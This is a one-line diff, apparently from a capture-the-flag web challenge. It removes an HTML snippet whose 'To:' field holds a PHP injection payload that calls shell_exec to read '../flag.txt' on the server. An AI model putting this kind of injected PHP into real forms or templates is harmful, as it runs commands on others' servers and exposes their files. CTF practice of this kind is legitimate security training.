@@ -1,1 +1,0 @@
-<h3>To: <?php echo shell_exec('cat ../flag.txt'); ?>, From: </h3><h1></h1><p></p>
